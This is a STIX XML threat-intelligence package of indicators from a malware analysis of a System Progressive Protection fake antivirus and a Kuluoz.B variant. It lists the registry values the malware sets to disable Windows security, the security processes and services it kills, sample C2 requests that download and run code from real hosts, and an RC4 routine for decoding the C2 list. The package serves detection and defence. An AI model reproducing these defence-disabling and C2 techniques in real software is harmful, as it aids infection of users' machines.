@@ -1,0 +1,649 @@
+<stix:STIX_Package xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:AddrObj="http://cybox.mitre.org/objects#AddressObject-2" xmlns:CISCP="http://www.us-cert.gov/ciscp" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="CISCP:IB-14-10044" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>System Progressive Protection and Kulouz Malware Analysis</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent>
+    <stix:Description>On 10 October 2012, two files were submitted for analysis by a government agency.  The first is a System Progressive Protection malware variant and the second is a Kulouz.B variant. Both pieces of malware call out to command and control (C2) domains.
+
+This document incorporates data originally released as US-CERT MIFR-248594.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2014-01-28T15:57:46Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-f9f94bac-e5d3-4c9f-b139-ba0ca63dd44c" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-7c20b172-0c30-48fe-ad81-88d339bb8565"/>
+        <indicator:Indicator idref="CISCP:indicator-707606a2-9d4c-4853-924c-f132f2a87724"/>
+        <indicator:Indicator idref="CISCP:indicator-63e9142f-d730-4a41-a63d-7a4098cf25f8"/>
+        <indicator:Indicator idref="CISCP:indicator-c76080f0-f2e2-48e5-8505-694337b8e3e1"/>
+        <indicator:Indicator idref="CISCP:indicator-0f363d76-0c2e-48b5-9c47-f4103ffd1a78"/>
+        <indicator:Indicator idref="CISCP:indicator-85453453-110c-438b-a3a6-6dc923d73af4"/>
+        <indicator:Indicator idref="CISCP:indicator-026b9640-190c-41fb-99fc-7808a6f0acaa"/>
+        <indicator:Indicator idref="CISCP:indicator-939ce304-1eef-40f1-a239-9239a9f004b9"/>
+        <indicator:Indicator idref="CISCP:indicator-e944d59a-4489-4796-94c8-39494be398c9"/>
+        <indicator:Indicator idref="CISCP:indicator-f6f55835-ef9c-4adf-ba87-277c5d896028"/>
+        <indicator:Indicator idref="CISCP:indicator-5fad487b-3c43-4be9-9103-f9c327be4ae9"/>
+        <indicator:Indicator idref="CISCP:indicator-05163283-190e-4377-a71a-3b7c7e950e02"/>
+        <indicator:Indicator idref="CISCP:indicator-ab7572df-5ee5-47f1-8a79-c38159ff50c9"/>
+        <indicator:Indicator idref="CISCP:indicator-520ebd85-4bc7-4690-8f37-4e47a50ee7d3"/>
+        <indicator:Indicator idref="CISCP:indicator-faac2caa-4689-426f-b576-3cd2481fec1d"/>
+        <indicator:Indicator idref="CISCP:indicator-d4fea1f2-914e-49bb-8687-829c97ecb1be"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-7c20b172-0c30-48fe-ad81-88d339bb8565" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This file is associated with "System Progressive Protection" malware a variant of the "Win32/Winwebsec" malware family.
+The malware creates a new directory and puts a copy of itself in the following location:
+"%common_appdata%\[random name]\[random name].exe".
+The name of the created directory and the file name are the same and both 32 characters long.
+
+The malware drops an additional file in the same directory. The name of the file is
+"[random name].ico".
+
+The malware creates a named Mutex object. The name of the Mutex object is the same as the name generated for the files above but without extensions.
+
+Next, the malware creates a new thread to "lower" the security settings of the infected system. The following actions are taken:
+The Windows Security Center is disabled. This is achieved by setting up or creating the following registry keys:
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center]
+"FirstRunDisabled"=dword:00000001
+"AntiVirusDisableNotify"=dword:00000001
+"FirewallDisableNotify"=dword:00000001
+"UpdatesDisableNotify"=dword:00000001
+"AntiVirusOverride"=dword:00000001
+"FirewallOverride"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center\svc]
+"AntiVirusDisableNotify"=dword:00000001
+"AntiVirusOverride"=dword:00000001
+"FirewallDisableNotify"=dword:00000001
+"FirewallOverride"=dword:00000001
+"UpdatesDisableNotify"=dword:00000001
+
+Following processes are terminated, if they are running, on the infected system:
+"wscntfy.exe"
+"msascui.exe"
+"mpcmdrun.exe"
+"msmpeng.exe"
+"nissrv.exe"
+"msseces.exe"
+
+Following are the list of Services that are stopped and disabled on the infected system:
+"wuauserv"
+"wscsvc"
+"windefend"
+"msmpsvc"
+"avgfws"
+"avgwd"
+"AVGIDSAgent"
+"AVG Security"
+
+The malware sets up the following registry keys:
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"HideSCAHealth"=dword:00000001
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\luafv]
+"Start"=dword:00000004
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore]
+"RPSessionInterval"=dword:00000000
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system]
+"EnableLUA"=dword:00000000
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender]
+"DisableAntiSpyware"=dword:00000001
+Next, the malware creates Thread 2. This Thread is responsible for deleting the originally dropped executable.
+
+To stay persistent on the system, the malware creates the following registry key:
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]
+"[random name]"="%common_appdata%\\[random name]\\[random name].exe"
+
+The malware creates two threads for the purpose of communicating with a C2 (command and control) location.
+
+The malware downloads a file from a C2 and runs it on the system. The downloaded file is dropped as "%temp%\[random name].exe".
+
+Below are examples of the HTTP communication:
+GET /api/urls/?ts=f50c09e8&amp;affid=70300 HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0);(b:2600;c:INT-2C60;l:09)
+Host: 103.4.225.41
+Connection: Keep-Alive
+Cache-Control: no-cache
+Pragma: no-cache
+
+GET /api/stats/install/?ts=f50c09e8&amp;affid=70300&amp;ver=3070010&amp;group=srs HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0);(b:2600;c:INT-2C60;l:09)
+Host: 103.4.225.41
+Connection: Keep-Alive
+Cache-Control: no-cache
+Pragma: no-cache
+
+The "(b:2600;c:INT-2C60;l:09)" part of the User-Agent can be de-constructed as follows:
+"b:" + Internet Explorer Version Info taken from the
+"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Version" registry key;
+"c:" + data about processor derived by calling "cpuid";
+"l:" + data about the locale on the system.
+
+Next, the malware creates a shortcut on the Desktop with the properties as follows:
+Description = "System Progressive Protection"
+Show = true
+Working Directory = "%common_appdata%\[random name]\[random name].exe"
+Icon Location = "%common_appdata%\[random name]\[random name].ico"
+The malware terminates all the instances of the Internet Explorer running on the system.
+
+The malware creates a clean up thread to delete files associated with Internet Explorer. All the files in the following directories are deleted:
+"%appdata%\Local\Microsoft\Internet Explorer\Recovery\Active"
+"%appdata%\Local\Microsoft\Internet Explorer\Recovery\High\Last Active"
+"%appdata%\Local\Microsoft\Internet Explorer\Recovery\High\Active"
+"%appdata%\Internet Explorer\Recovery\Last Active""
+"%appdata%\Internet Explorer\Recovery\Active"
+
+The malware creates a shortcut in the start menu with the properties similar to the shortcut created on the Desktop. The malware creates another thread to terminate all the processes that run under the user credentials. The malware won't terminate any of the processes running as a privileged user such as "SYSTEM", "LOCAL SERVICE, or "REMOTE SERVICE".
+
+The following registry key is created:
+[HKEY_CURRENT_USER\Software\Microsoft\Installer\Products\[random name]]
+@=dword:00000001
+The malware starts the GUI Application pretending to be an Anti-Virus product.
+There are five languages supported: English, French, German, Spanish and Portuguese. The fake Anti-Virus claims that the system is infected with the malware and solicits the user to register and pay money for the updates and system's "cleanup".
+
+Below are an example of communication performed by the fake anti virus:
+
+GET /p/?&amp;lid=3070010&amp;affid=70300&amp;nid=EC910D5F&amp;group=srs HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET4.0E; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+Host: kilopaybilling.com
+Connection: Keep-Alive</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-75af6b75-4d7a-49c1-b1e9-48d5e2700326">
+        <cybox:Object id="CISCP:Object-7be3e8b7-e28c-4b70-b9a2-741abf3dc19e">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">hbpuhkud.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">485376</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">942bf50bb791453db1b4fc51737d2b58</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">087ff79863153b40b4f1a92ae4a3c31f9a8efc05</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">f4cd11b5a86ede8aa2f226e84781fe4c1bb7fbc1155c8e42e3486c915e02c873</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">12288:bNz2aiIH/tpvw2x082V0u48Gm77xfrCdoegFnOVEzHL:B6aiIlDx0DzGm77xzCC7nOVor</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T19:24:56"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-707606a2-9d4c-4853-924c-f132f2a87724" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This file is associated with "Kuluoz.B" malware which is a variant of the "Win32/Winwebsec" malware family. The malware creates a process named "svchost.exe". This process only exists in memory and has no physical file on the hard drive associated with it.
+
+The purpose of "svchost.exe" is to load a DLL file named "dll.dll" embedded within it. The embedded DLL has one exported function "Work". The "dll.dll" file has an array of hard-coded "IP Addresses : Port number" pairs:
+
+debug032:008C7000 DE 52 60 33 84 24
+stru_8C7000 ip_addresses_and_port_pairs &lt;336052DEh, 2484h&gt;
+decodes into --&gt; "125.214.75.185:84"
+
+debug032:008C7006 80 05 BD DF E2 A4
+ip_addresses_and_port_pairs &lt;0DFBD0580h, 0A4E2h&gt;
+decodes into --&gt; "217.160.236.108:84"
+
+debug032:008C700C F6 0D D8 85 50 78
+ip_addresses_and_port_pairs &lt;85D80DF6h, 7850h&gt;
+decodes into --&gt; "213.175.218.180:8080"
+
+debug032:008C7012 4B 0D 1E 3F 8C 6C
+ip_addresses_and_port_pairs &lt;3F1E0D4Bh, 6C8Ch&gt;
+decodes into --&gt; "213.175.218.181:8080"
+
+debug032:008C7018 1F C9 47 22 1E 66
+ip_addresses_and_port_pairs &lt;2247C91Fh, 661Eh&gt;
+decodes into --&gt; "46.105.121.86:8080"
+
+debug032:008C701E 10 A7 4F 10 13 1C
+ip_addresses_and_port_pairs &lt;104FA710h, 1C13h&gt;
+decodes into --&gt; "50.22.136.150:8080"
+
+debug032:008C7024 2C 05 49 AF F6 8D
+ip_addresses_and_port_pairs &lt;0AF49052Ch, 8DF6h&gt;
+decodes into --&gt; "188.212.156.180:8080"
+
+debug032:008C702A C2 BF 4F BE 22 F3
+ip_addresses_and_port_pairs &lt;0BE4FBFC2h, 0F322h&gt;
+decodes into --&gt; "94.247.176.157:8080"
+
+debug032:008C7030 33 54 C9 B1 0C 5C
+ip_addresses_and_port_pairs &lt;0B1C95433h, 5C0Ch&gt;
+decodes into --&gt; "202.169.224.202:8080"
+
+debug032:008C7036 59 DE F6 C3 58 17
+ip_addresses_and_port_pairs &lt;0C3F6DE59h, 1758h&gt;
+decodes into --&gt; "178.77.103.54:8080"
+
+debug032:008C703C 22 E2 8A AC 29 64
+ip_addresses_and_port_pairs &lt;0AC8AE222h, 6429h&gt;
+decodes into --&gt; "46.4.180.98:8080"
+
+"IP Address : port number" encryption is based on the RC4 algorithm. The initial RC4 key is "OdoiVTn5oy". The pairs of "IP Address : Port number" can be decoded by using the following algorithm:
+
+---BEGIN DECODING ALGORITHM---
+typedef struct _rc4_key_t
+{
+unsigned char state[256];
+unsigned char x;
+unsigned char y;
+}rc4_key_t;
+
+int decode(char key[], //initial RC4 key
+unsigned int array_offset, //offset in the array of ip_address
+//port number structures
+unsigned int encoded_ip, //encrypted ip address
+unsigned int encoded_port) //encrypted port number
+{
+rc4_key_t * rc4_data;
+unsigned int i = 6 * array_offset;
+unsigned int j = 0;
+unsigned char result;
+unsigned int int1 = 0, int2 = 0;
+unsigned int decoded_ip = 0;
+unsigned int decoded_port = 0;
+unsigned char * ip_port_pair;
+rc4_data = (rc4_key_t *) malloc(sizeof(rc4_key_t));
+ip_port_pair = (unsigned char *) malloc (sizeof(unsigned char) * 22);
+memset(rc4_data-&gt;state,0,256);
+rc4_set_key(key,strlen(key),rc4_data);
+//regular rc4 key scheduling.
+for(j = 0; j &lt; i; j++)
+{
+result = decode(rc4_data-&gt;state,&amp;int1,&amp;int2);
+}
+result = decode(rc4_data-&gt;state,&amp;int1,&amp;int2);
+decoded_ip = (result ^ encoded_ip) &amp; 0x000000FF;
+result = decode(rc4_data-&gt;state,&amp;int1,&amp;int2);
+decoded_ip = decoded_ip + ((result ^
+((encoded_ip &amp; 0x0000FF00)&gt;&gt;8))&lt;&lt;8);
+result = decode(rc4_data-&gt;state,&amp;int1,&amp;int2);
+decoded_ip = decoded_ip + ((result ^
+((encoded_ip &amp; 0x00FF0000)&gt;&gt;16))&lt;&lt;16);
+result = decode(rc4_data-&gt;state,&amp;int1,&amp;int2);
+decoded_ip = decoded_ip + ((result ^
+((encoded_ip &amp; 0xFF000000)&gt;&gt;24))&lt;&lt;24);
+result = decode(rc4_data-&gt;state,&amp;int1,&amp;int2);
+decoded_port = (result ^ encoded_port) &amp; 0x000000FF;
+result = decode(rc4_data-&gt;state,&amp;int1,&amp;int2);
+decoded_port = decoded_port + ((result ^
+((encoded_port &amp; 0x0000FF00)&gt;&gt;8))&lt;&lt;8);
+return 1;
+}
+unsigned char decode(unsigned char * key_data, unsigned int * int1,
+unsigned int * int2)
+{
+unsigned char ch;
+*int1 = ((*int1) + 1) % 0x100u;
+*int2 = ((*int2) + (unsigned int)key_data[*int1]) % 0x100u;
+ch = key_data[*int2];
+key_data[*int2] = key_data[*int1];
+key_data[*int1] = ch;
+return key_data[(key_data[*int2] + ch) % 256];
+}
+---END DECODING ALGORITHM---
+
+The malware communicates with a C2 location using RC4 encrypted HTTP messages. Below is the example of the plain text message:
+00AFEEF8 2F 69 6E 64 65 78 2E 70 68 70 3F 72 3D 67 61 74 /index.php?r=gat
+00AFEF08 65 26 69 64 3D 65 63 39 31 30 64 35 66 26 67 72 e&amp;id=ec910d5f&amp;gr
+00AFEF18 6F 75 70 3D 6E 30 39 31 30 72 63 6D 26 64 65 62 oup=n0910rcm&amp;deb
+00AFEF28 75 67 3D 30 26 69 70 73 3D 31 36 39 2E 32 35 34 ug=0&amp;ips=169.254
+00AFEF38 2E 31 37 31 2E 31 32 35 00 00 00 00 00 00 00 00 .171.125
+
+The value of "id" is the key used to encrypt the message.
+The key used for RC4 encryption is unique for each system it runs on and is calculated based on the information stored in the registry. The value of "ips" is the IP Address of the infected system.
+
+The same message after being RC4 encoded becomes:
+00B04F28 37 31 33 39 31 44 33 42 34 35 45 35 35 33 39 46 71391D3B45E5539F
+00B04F38 44 38 46 39 30 42 36 46 38 38 43 36 43 38 42 30 D8F90B6F88C6C8B0
+00B04F48 35 38 33 32 37 37 33 34 35 30 46 30 35 41 32 41 5832773450F05A2A
+00B04F58 36 35 31 44 41 36 39 39 33 39 32 46 36 38 38 45 651DA699392F688E
+00B04F68 36 43 46 34 37 32 35 30 38 45 42 42 44 41 38 33 6CF472508EBBDA83
+00B04F78 30 32 37 39 46 38 39 45 35 36 44 33 44 45 35 38 0279F89E56D3DE58
+00B04F88 42 46 38 35 32 43 38 42 42 34 39 31 34 43 33 41 BF852C8BB4914C3A
+00B04F98 46 36 32 41 35 35 43 32 42 46 44 38 33 36 36 38 F62A55C2BFD83668
+00B04FA8 35 39 46 31 30 44 46 45 46 34 44 39 30 31 37 37 59F10DFEF4D90177
+
+The sample HTTP GET sent to the C2 is:
+00AFDEF0 68 74 74 70 3A 2F 2F 34 36 2E 31 30 35 2E 31 32 http://46.105.12
+00AFDF00 31 2E 38 36 3A 38 30 38 30 2F 65 63 39 31 30 64 1.86:8080/ec910d
+00AFDF10 35 66 37 31 33 39 31 44 33 42 34 35 45 35 35 33 5f71391D3B45E553
+00AFDF20 39 46 44 38 46 39 30 42 36 46 38 38 43 36 43 38 9FD8F90B6F88C6C8
+00AFDF30 42 30 35 38 33 32 37 37 33 34 35 30 46 30 35 41 B05832773450F05A
+00AFDF40 32 41 36 35 31 44 41 36 39 39 33 39 32 46 36 38 2A651DA699392F68
+00AFDF50 38 45 36 43 46 34 37 32 35 30 38 45 42 42 44 41 8E6CF472508EBBDA
+00AFDF60 38 33 30 32 37 39 46 38 39 45 35 36 44 33 44 45 830279F89E56D3DE
+00AFDF70 35 38 42 46 38 35 32 43 38 42 42 34 39 31 34 43 58BF852C8BB4914C
+00AFDF80 33 41 46 36 32 41 35 35 43 32 42 46 44 38 33 36 3AF62A55C2BFD836
+00AFDF90 36 38 35 39 46 31 30 44 46 45 46 34 44 39 30 31 6859F10DFEF4D901
+00AFDFA0 37 37 00 00 00 00 00 00 00 00 00 00 00 00 00 00 77</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-ea57251b-3fc0-4ff8-9696-34298ba1f41c">
+        <cybox:Object id="CISCP:Object-3520d019-74c3-4564-b826-fd50c35b89dc">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">Label_Copy_UPS.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">87040</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">b22bb2fe73759e24822fbd9425745801</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">0b87c5255c8c5b343fc2f49e64ce0705b3754239</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">1223eca645d984a47e1ce86c689a558ca06ab6adedb8d9d20238fbc195d0c484</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">1536:E9IMbTgayFksLSkjQzTYzm7xtnz35qcKDWGEG4e/zBR6tICBLREMdzzzzzzzzzzb:E91QayF3mHnYgzJqcKPzBR6trBLREMdj</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T19:24:56"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-63e9142f-d730-4a41-a63d-7a4098cf25f8" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>The file hbpuhkud.exe (MD5: 942bf50bb791453db1b4fc51737d2b58) calls out to this URL to download malware.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-4f289966-191f-41cf-97f4-93d4e61eb7b7">
+        <cybox:Object id="CISCP:Object-28d35ca0-e852-48b2-afcc-5cf92c7836d5">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://103.4.225.41/api/urls/?ts=f50c09e8&amp;affid=70300</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T19:24:56"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-c76080f0-f2e2-48e5-8505-694337b8e3e1" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>The file hbpuhkud.exe (MD5: 942bf50bb791453db1b4fc51737d2b58) calls out to this URL to download malware.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-89adbcaa-d256-4334-ac07-d244ea392d1f">
+        <cybox:Object id="CISCP:Object-c493f1ff-5ebe-4fcf-b68c-0c7505bfe642">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://103.4.225.41/api/stats/install/?ts=f50c09e8&amp;affid=70300&amp;ver=3070010&amp;group=srs</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-10-10T19:24:56"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-0f363d76-0c2e-48b5-9c47-f4103ffd1a78" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>The file hbpuhkud.exe (MD5: 942bf50bb791453db1b4fc51737d2b58) calls out to this URL.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-e5fbcc9a-2595-4dae-9d24-57fddaa8054f">
+        <cybox:Object id="CISCP:Object-ccf3e8e4-83b6-49cf-8f48-157175459bd0">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://kilopaybilling.com/p/?&amp;lid=3070010&amp;affid=70300&amp;nid=EC910D5F&amp;group=srs</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
